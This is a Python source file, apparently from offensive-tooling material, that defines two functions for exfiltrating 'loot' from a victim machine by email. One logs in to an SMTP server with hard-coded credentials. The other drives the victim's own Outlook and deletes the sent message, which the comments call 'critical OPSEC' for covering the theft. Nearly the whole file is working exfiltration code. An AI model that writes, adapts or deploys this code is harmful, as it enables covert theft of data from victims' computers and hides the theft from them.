'''
EDIT: Line 19 needs to have 'contents.decode()' if an encrypted string from encrypt() is being sent. This code was tested with plaintext payloads that were not encoded so that was removed.

These functions take a subject and payload along with valid email information, and exfiltrate the payload to the target email address. The outlook() function is Windows only, plain_email is platform independent.
'''

import smtplib
import time
import win32com.client

smtp_server = 'smtp.outlook.com'
smtp_port = 587
smtp_acct = 'from@example.com'
smtp_password = 'password'
tgt_accts = ['to@example.com']

def plain_email(subject, contents):                         # this is a platform independent function to send emails to target accounts
    message = f'Subject: {subject}\nFrom {smtp_acct}\n'     # the 'subject' is supposed to be the name of the file containing the loot from the victim machine
    message += f'To: {tgt_accts}\n\n{contents.decode()}'    # the 'contents' is supposed to be the encrypted byte string returned from the encrypt() function from cryptor.py
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()                                       # begin a TLS encrypted conversation with the SMTP server
    server.login(smtp_acct, smtp_password)                  # login to the SMTP server with hard coded credentials

    # server.set_debuglevel(1)                          # useful for debugging connection/SMTP issues prior to deployment
    server.sendmail(smtp_acct, tgt_accts, message)      # send the email to the target account(s) over the established channel.
    time.sleep(1)
    server.quit()                                       # drop the connection to the SMTP server

def outlook(subject, contents):
    outlook = win32com.client.Dispatch("Outlook.Application")           # create an instance of the Outlook application
    message = outlook.CreateItem(0)
    message.DeleteAfterSubmit = True                                # making sure the email message is deleted right after it is submitted (this is critical OPSEC)
    message.Subject = subject
    message.Body = contents.decode()
    message.To = tgt_accts[0]
    message.Send()                                                  # once the message particulars are assigned, we send the email off.

if __name__ == "__main__":
    plain_email('test message', 'PREPARE TO COPY')

